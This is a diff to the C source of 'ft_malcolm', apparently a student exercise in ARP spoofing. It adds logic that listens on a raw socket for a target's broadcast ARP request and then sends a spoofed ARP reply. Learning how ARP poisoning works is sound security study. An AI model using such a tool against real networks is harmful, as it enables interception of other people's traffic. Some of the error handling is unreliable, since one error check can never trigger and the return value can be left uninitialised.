@@ -1,10 +1,14 @@
 #include "ft_malcolm.h"
 
-int run(t_malcolm *malcolm, const t_client *source, t_client *target)
+int run(t_malcolm *malcolm)
 {
-	(void)source, (void)target;
+	int ok;
+
 	if (initialize_socket(malcolm) < 0)
+	{
+		// socket already closed here
 		return -1;
+	}
 
 	socklen_t addrlen = sizeof(struct sockaddr_ll);
 
@@ -14,9 +18,10 @@ int run(t_malcolm *malcolm, const t_client *source, t_client *target)
 		ssize_t bytes_read = recvfrom(malcolm->sockfd, buffer, BUFF_SIZE, 0, (struct sockaddr *)&malcolm->sll, &addrlen);
 		if (bytes_read < -1)
 		{
-			return handle_error("recvfrom");
+			ok = handle_error("recvfrom");
+			break ;
 		}
-		else if (bytes_read < 0)
+		else if (bytes_read <= 0)
 		{
 			break;
 		}
@@ -28,14 +33,27 @@ int run(t_malcolm *malcolm, const t_client *source, t_client *target)
 				t_arphdr *arp = (t_arphdr *)(buffer + sizeof(struct ethhdr));
 				malcolm->packet.eth = eth;
 				malcolm->packet.arp = arp;
-				verbose(malcolm);
+				if (is_broadcast_request(&malcolm->packet) && \
+						is_request(&malcolm->packet) && \
+						is_from_target(malcolm, &malcolm->packet) && \
+						is_requesting_source(malcolm, &malcolm->packet))
+				{
+					if (malcolm->verbose)
+					{
+						verbose(malcolm);
+					}
+					ok = send_spoofed_arp(malcolm);
+					break ;
+				}
 			}
 		}
 	}
 
 	close(malcolm->sockfd);
 
-	return 0;
+	printf("good-bye!\n");
+
+	return ok;
 }
 
 int main(int argc, char **argv)
@@ -43,17 +61,20 @@ int main(int argc, char **argv)
 	t_client source, target;
 	t_malcolm malcolm = {0};
 
-	if (argc != 5)
+	if (argc < 5 || argc > 6)
 	{
-		printf("Usage: %s [source ip] [source mac address] [target ip] [target mac address]\n", argv[0]);
+		print_help(argv[0]);
 		return -1;
 	}
 
-	if (parse_arguments(argv, &source, &target) != 0)
+	if (parse_arguments(argv, &source, &target, &malcolm.verbose) != 0)
 	{
 		return -1;
 	}
 
-	return run(&malcolm, &source, &target);
+	malcolm.source = source;
+	malcolm.target = target;
+
+	return run(&malcolm);
 }
 
